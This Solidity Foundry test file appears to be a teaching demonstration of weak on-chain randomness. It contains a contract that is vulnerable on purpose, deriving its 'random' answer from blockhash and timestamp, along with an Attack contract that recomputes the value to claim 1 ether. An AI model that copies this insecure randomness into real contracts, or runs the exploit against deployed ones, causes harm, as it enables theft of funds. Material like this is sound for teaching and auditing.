// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "lib/forge-std/src/Test.sol";
//============================================================================================
contract ContractTestRandomness is Test {
        GuessTheRandomNumber GuessTheRandomNumberContract;
        Attack AttackerContract;

function testRandomness() public {

    address alice = vm.addr(1);
    address eve = vm.addr(2);
    vm.deal(address(alice), 1 ether);   
    vm.prank(alice);   

    GuessTheRandomNumberContract = new GuessTheRandomNumber{value: 1 ether}();
    
    vm.startPrank(eve);   
    AttackerContract = new Attack();
    console.log("Before exploiting, Balance of AttackerContract:",address(AttackerContract).balance);
    AttackerContract.attack(GuessTheRandomNumberContract);  
    console.log("Eve wins 1 Eth, Balance of AttackerContract:",address(AttackerContract).balance);
    console.log("Exploit completed");

    }
    receive() payable external{}
}
//============================================================================================
//============================================================================================
contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        console.log("answerGuessTheRandomNumber",answer);

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}
//============================================================================================
//============================================================================================
contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        console.log("answerAttack",answer);

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}